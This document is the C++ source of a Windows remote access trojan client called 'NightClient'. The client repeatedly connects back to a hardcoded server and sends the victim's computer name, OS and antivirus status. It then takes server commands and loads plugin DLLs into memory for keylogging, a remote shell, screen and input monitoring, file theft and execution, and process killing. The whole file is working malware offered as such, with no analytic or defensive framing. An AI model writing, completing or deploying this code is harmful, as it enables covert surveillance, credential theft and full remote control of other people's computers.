#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <cstdint>
#include "../include/json.hpp"
#include "../include/PluginManager.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

using json = nlohmann::json;
using namespace std;

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature; // 0x524E ('NR')
    uint8_t  type;      // 0x01: JSON, 0x02: DLL
    uint32_t size;      // Payload size
};
#pragma pack(pop)

class NightClient {
private:
    SOCKET sock;
    PluginManager pluginMgr;
    bool connected = false;
    string pendingPluginId;
    string pendingPluginCommand;
    bool hasPendingPluginCommand = false;

    const string INFORMATION_PLUGIN_ID = "InformationPlugin";
    const string PROCESS_MANAGER_PLUGIN_ID = "ProcessManagerPlugin";
    const string REMOTE_SHELL_PLUGIN_ID = "RemoteShellPlugin";
    const string REMOTE_MONITORING_PLUGIN_ID = "RemoteMonitoringPlugin";
    const string KEYLOGGER_PLUGIN_ID = "KeyloggerPlugin";
    const string OPEN_URL_PLUGIN_ID = "OpenURLPlugin";
    const string FILE_MANAGER_PLUGIN_ID = "FileManagerPlugin";

    // Registry helper for initial info
    string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
        char data[255];
        DWORD dataSize = sizeof(data);
        if (RegGetValueA(hKeyRoot, subKey, valueName, RRF_RT_REG_SZ, NULL, data, &dataSize) == ERROR_SUCCESS)
            return string(data);
        return "N/A";
    }

    void send_data(json data) {
        if (!connected) return;
        string msg = data.dump() + "\r\n";
        send(sock, msg.c_str(), (int)msg.length(), 0);
    }

    void request_plugin(const string& pluginId, const json& commandToRunAfterLoad = json()) {
        pendingPluginId = pluginId;
        hasPendingPluginCommand = !commandToRunAfterLoad.is_null();
        pendingPluginCommand = hasPendingPluginCommand ? commandToRunAfterLoad.dump() : "";

        cout << "[*] " << pluginId << " not found, requesting from server..." << endl;
        send_data({{"action", "request_plugin"}, {"id", pluginId}});
    }

    void execute_process_manager_command(const json& data) {
        if (pluginMgr.isPluginLoaded(PROCESS_MANAGER_PLUGIN_ID)) {
            pluginMgr.executePluginCommand(PROCESS_MANAGER_PLUGIN_ID, "HandleCommand", sock, data.dump());
        } else {
            request_plugin(PROCESS_MANAGER_PLUGIN_ID, data);
        }
    }

    void execute_remote_shell_command(const json& data) {
        if (pluginMgr.isPluginLoaded(REMOTE_SHELL_PLUGIN_ID)) {
            pluginMgr.executePluginCommand(REMOTE_SHELL_PLUGIN_ID, "HandleCommand", sock, data.dump());
        } else {
            request_plugin(REMOTE_SHELL_PLUGIN_ID, data);
        }
    }

    void execute_remote_monitoring_command(const json& data) {
        if (pluginMgr.isPluginLoaded(REMOTE_MONITORING_PLUGIN_ID)) {
            pluginMgr.executePluginCommand(REMOTE_MONITORING_PLUGIN_ID, "HandleCommand", sock, data.dump());
        } else {
            request_plugin(REMOTE_MONITORING_PLUGIN_ID, data);
        }
    }

    void execute_keylogger_command(const json& data) {
        if (pluginMgr.isPluginLoaded(KEYLOGGER_PLUGIN_ID)) {
            pluginMgr.executePluginCommand(KEYLOGGER_PLUGIN_ID, "HandleCommand", sock, data.dump());
        } else {
            request_plugin(KEYLOGGER_PLUGIN_ID, data);
        }
    }

    void execute_open_url_command(const json& data) {
        if (pluginMgr.isPluginLoaded(OPEN_URL_PLUGIN_ID)) {
            pluginMgr.executePluginCommand(OPEN_URL_PLUGIN_ID, "HandleCommand", sock, data.dump());
        } else {
            request_plugin(OPEN_URL_PLUGIN_ID, data);
        }
    }

    void execute_file_manager_command(const json& data) {
        if (pluginMgr.isPluginLoaded(FILE_MANAGER_PLUGIN_ID)) {
            pluginMgr.executePluginCommand(FILE_MANAGER_PLUGIN_ID, "HandleCommand", sock, data.dump());
        } else {
            request_plugin(FILE_MANAGER_PLUGIN_ID, data);
        }
    }

    void process_json_command(const string& json_str) {
        try {
            auto data = json::parse(json_str);
            string action = data.value("action", "");

            if (action == "getinfo") {
                if (pluginMgr.isPluginLoaded(INFORMATION_PLUGIN_ID)) {
                    pluginMgr.executePlugin(INFORMATION_PLUGIN_ID, "RunPlugin", sock);
                } else {
                    request_plugin(INFORMATION_PLUGIN_ID);
                }
            }
            else if (action == "getprocesses" || action == "killprocess" || action == "restartprocess") {
                execute_process_manager_command(data);
            }
            else if (action == "shellstart" || action == "shellcommand" || action == "shellstop") {
                execute_remote_shell_command(data);
            }
            else if (action == "monitorlist" || action == "monitorstart" || action == "monitorstop" ||
                     action == "mouseevent" || action == "keyevent") {
                execute_remote_monitoring_command(data);
            }
            else if (action == "keylogstart" || action == "keylogstop") {
                execute_keylogger_command(data);
            }
            else if (action == "openurl") {
                execute_open_url_command(data);
            }
            else if (action == "getdrives" || action == "getfiles" || action == "deletefile" ||
                     action == "rename"   || action == "execute"  || action == "createfolder" ||
                     action == "copyfile" || action == "pastefile" || action == "downloadfile" ||
                     action == "uploadfile") {
                execute_file_manager_command(data);
            }
            else if (action == "message" || action == "messagebox") {
				string title = data.value("title", "System Message");
				string text  = data.value("text", "");
				string type  = data.value("type", "info");

				UINT iconFlag = MB_ICONINFORMATION; // default

				if (type == "warning") {
					iconFlag = MB_ICONWARNING;
				}
				else if (type == "error") {
					iconFlag = MB_ICONERROR;
				}
				else if (type == "info") {
					iconFlag = MB_ICONINFORMATION;
				}

				thread([title, text, iconFlag]() {
					MessageBoxA(NULL, text.c_str(), title.c_str(),
								MB_OK | iconFlag | MB_SYSTEMMODAL);
					}).detach();
			}
            else if (action == "ping") {
                send_data({{"action", "pong"}});
            }
        } catch (...) {}
    }

    void handle_server_messages() {
        vector<uint8_t> recv_buffer;
        uint8_t chunk[8192];

        while (connected) {
            int bytesRead = recv(sock, (char*)chunk, sizeof(chunk), 0);
            if (bytesRead <= 0) break;

            recv_buffer.insert(recv_buffer.end(), chunk, chunk + bytesRead);

            while (!recv_buffer.empty()) {
                if (recv_buffer.size() >= sizeof(PacketHeader)) {
                    PacketHeader* header = (PacketHeader*)recv_buffer.data();
                    if (header->signature == 0x524E) {
                        if (recv_buffer.size() < sizeof(PacketHeader) + header->size) break;

                        uint8_t* payload = recv_buffer.data() + sizeof(PacketHeader);
                        if (header->type == 0x01) {
                            process_json_command(string((char*)payload, header->size));
                        } else if (header->type == 0x02) {
                            cout << "[+] DLL received from server." << endl;
                            vector<uint8_t> dll_data(payload, payload + header->size);
                            string pluginId = pendingPluginId.empty() ? INFORMATION_PLUGIN_ID : pendingPluginId;

                            if (pluginMgr.loadPluginFromMemory(pluginId, dll_data)) {
                                if (pluginId == INFORMATION_PLUGIN_ID) {
                                    pluginMgr.executePlugin(INFORMATION_PLUGIN_ID, "RunPlugin", sock);
                                } else if (pluginId == PROCESS_MANAGER_PLUGIN_ID) {
                                    if (hasPendingPluginCommand) {
                                        pluginMgr.executePluginCommand(PROCESS_MANAGER_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
                                    } else {
                                        pluginMgr.executePlugin(PROCESS_MANAGER_PLUGIN_ID, "RunPlugin", sock);
                                    }
                                } else if (pluginId == REMOTE_SHELL_PLUGIN_ID) {
                                    if (hasPendingPluginCommand) {
                                        pluginMgr.executePluginCommand(REMOTE_SHELL_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
                                    } else {
                                        pluginMgr.executePlugin(REMOTE_SHELL_PLUGIN_ID, "RunPlugin", sock);
                                    }
                                } else if (pluginId == REMOTE_MONITORING_PLUGIN_ID) {
                                    if (hasPendingPluginCommand) {
                                        pluginMgr.executePluginCommand(REMOTE_MONITORING_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
                                    } else {
                                        pluginMgr.executePlugin(REMOTE_MONITORING_PLUGIN_ID, "RunPlugin", sock);
                                    }
                                } else if (pluginId == KEYLOGGER_PLUGIN_ID) {
                                    if (hasPendingPluginCommand) {
                                        pluginMgr.executePluginCommand(KEYLOGGER_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
                                    } else {
                                        pluginMgr.executePlugin(KEYLOGGER_PLUGIN_ID, "RunPlugin", sock);
                                    }
                                } else if (pluginId == OPEN_URL_PLUGIN_ID) {
                                    if (hasPendingPluginCommand) {
                                        pluginMgr.executePluginCommand(OPEN_URL_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
                                    } else {
                                        pluginMgr.executePlugin(OPEN_URL_PLUGIN_ID, "RunPlugin", sock);
                                    }
                                } else if (pluginId == FILE_MANAGER_PLUGIN_ID) {
                                    if (hasPendingPluginCommand) {
                                        pluginMgr.executePluginCommand(FILE_MANAGER_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
                                    } else {
                                        pluginMgr.executePlugin(FILE_MANAGER_PLUGIN_ID, "RunPlugin", sock);
                                    }
                                }
                            }

                            pendingPluginId.clear();
                            pendingPluginCommand.clear();
                            hasPendingPluginCommand = false;
                        }
                        recv_buffer.erase(recv_buffer.begin(), recv_buffer.begin() + sizeof(PacketHeader) + header->size);
                        continue;
                    }
                }

                string current_buf((char*)recv_buffer.data(), recv_buffer.size());
                size_t pos = current_buf.find("\r\n");
                if (pos != string::npos) {
                    process_json_command(current_buf.substr(0, pos));
                    recv_buffer.erase(recv_buffer.begin(), recv_buffer.begin() + pos + 2);
                    continue;
                }

                if (recv_buffer.size() > 20 * 1024 * 1024) recv_buffer.clear();
                break;
            }
        }
        connected = false;
    }

    void send_initial_info() {
        time_t now = time(0);
        char date_buf[20];
        strftime(date_buf, sizeof(date_buf), "%Y-%m-%d %H:%M:%S", localtime(&now));

        char pcname[256];
        DWORD pSize = sizeof(pcname);
        GetComputerNameA(pcname, &pSize);

        json info = {
            {"action",    "initial_info"},
            {"ip",        "127.0.0.1"},
            {"os",        getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName")},
            {"country",   "Turkey"},
            {"desktop",   string(pcname)},
            {"antivirus", (GetFileAttributesA("C:\\ProgramData\\Microsoft\\Windows Defender") != INVALID_FILE_ATTRIBUTES) ? "Windows Defender" : "Other/None"},
            {"uac",       "Enabled"},
            {"date",      string(date_buf)}
        };
        send_data(info);
    }

public:
    void start(const char* ip, int port) {
        while (true) {
            WSADATA wsa;
            WSAStartup(MAKEWORD(2, 2), &wsa);
            sock = socket(AF_INET, SOCK_STREAM, 0);

            sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(port);
            inet_pton(AF_INET, ip, &addr.sin_addr);

            cout << "[...] Connecting to: " << ip << ":" << port << endl;

            if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
                cout << "[+] Connection successful!" << endl;
                connected = true;

                send_initial_info();
                handle_server_messages();
            }

            closesocket(sock);
            WSACleanup();
            this_thread::sleep_for(chrono::seconds(5));
        }
    }
};

int main() {
    NightClient client;
    client.start("192.168.1.7", 1337);
    return 0;
}
